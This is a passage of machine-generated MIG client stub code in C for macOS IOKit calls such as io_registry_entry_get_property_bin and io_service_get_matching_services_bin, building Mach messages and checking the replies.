	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_server_version_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_server_version_t__defined */

	__DeclareSendRpc(2877, "io_server_version")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2877;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2877, "io_server_version")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2877, "io_server_version")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_server_version_t__defined)
	check_result = __MIG_check__Reply__io_server_version_t((__Reply__io_server_version_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_server_version_t__defined) */

	*version = Out0P->version;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_properties_bin_t(__Reply__io_registry_entry_get_properties_bin_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_properties_bin_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2978) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_properties_bin */
mig_external kern_return_t io_registry_entry_get_properties_bin
(
	mach_port_t registry_entry,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined */

	__DeclareSendRpc(2878, "io_registry_entry_get_properties_bin")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2878;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2878, "io_registry_entry_get_properties_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2878, "io_registry_entry_get_properties_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_properties_bin_t((__Reply__io_registry_entry_get_properties_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_t__defined) */

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_property_bin_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_property_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_property_bin_t(__Reply__io_registry_entry_get_property_bin_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_property_bin_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2979) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_property_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_property_bin */
mig_external kern_return_t io_registry_entry_get_property_bin
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_get_property_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_property_bin_t__defined */

	__DeclareSendRpc(2879, "io_registry_entry_get_property_bin")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->planeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 256) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->property_name, property_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->property_name, property_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->property_nameOffset = 0;

	msgh_size_delta = _WALIGN_(InP->property_nameCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->options = options;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2879;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2879, "io_registry_entry_get_property_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2879, "io_registry_entry_get_property_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_property_bin_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_property_bin_t((__Reply__io_registry_entry_get_property_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_property_bin_t__defined) */

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_service_bin_t__defined)
#define __MIG_check__Reply__io_service_get_matching_service_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_service_bin_t(__Reply__io_service_get_matching_service_bin_t *Out0P)
{

	typedef __Reply__io_service_get_matching_service_bin_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2980) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->service.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->service.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_service_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_service_bin */
mig_external kern_return_t io_service_get_matching_service_bin
(
	mach_port_t master_port,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t *service
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_get_matching_service_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_service_bin_t__defined */

	__DeclareSendRpc(2880, "io_service_get_matching_service_bin")

	InP->NDR = NDR_record;

	if (matchingCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->matching, (const char *) matching, matchingCnt);

	InP->matchingCnt = matchingCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4096) + (_WALIGN_(matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2880;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2880, "io_service_get_matching_service_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2880, "io_service_get_matching_service_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_service_bin_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_service_bin_t((__Reply__io_service_get_matching_service_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_service_bin_t__defined) */

	*service = Out0P->service.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_matching_services_bin_t__defined)
#define __MIG_check__Reply__io_service_get_matching_services_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_matching_services_bin_t(__Reply__io_service_get_matching_services_bin_t *Out0P)
{

	typedef __Reply__io_service_get_matching_services_bin_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2981) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->existing.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->existing.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_services_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_services_bin */
mig_external kern_return_t io_service_get_matching_services_bin
(
	mach_port_t master_port,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t *existing
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_get_matching_services_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_services_bin_t__defined */

	__DeclareSendRpc(2881, "io_service_get_matching_services_bin")

	InP->NDR = NDR_record;

	if (matchingCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->matching, (const char *) matching, matchingCnt);

	InP->matchingCnt = matchingCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4096) + (_WALIGN_(matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2881;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2881, "io_service_get_matching_services_bin")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2881, "io_service_get_matching_services_bin")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_services_bin_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_services_bin_t((__Reply__io_service_get_matching_services_bin_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_services_bin_t__defined) */

	*existing = Out0P->existing.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_match_property_table_bin_t__defined)
#define __MIG_check__Reply__io_service_match_property_table_bin_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_match_property_table_bin_t(__Reply__io_service_match_property_table_bin_t *Out0P)
{

	typedef __Reply__io_service_match_property_table_bin_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2982) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_match_property_table_bin_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_match_property_table_bin */
mig_external kern_return_t io_service_match_property_table_bin
(
	mach_port_t service,
	io_struct_inband_t matching,
	mach_msg_type_number_t matchingCnt,
	boolean_t *matches
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingCnt;
		char matching[4096];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t matches;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_match_property_table_bin_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_match_property_table_bin_t__defined */

	__DeclareSendRpc(2882, "io_service_match_property_table_bin")

	InP->NDR = NDR_record;

	if (matchingCnt > 4096) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->matching, (const char *) matching, matchingCnt);

	InP->matchingCnt = matchingCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 4096) + (_WALIGN_(matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
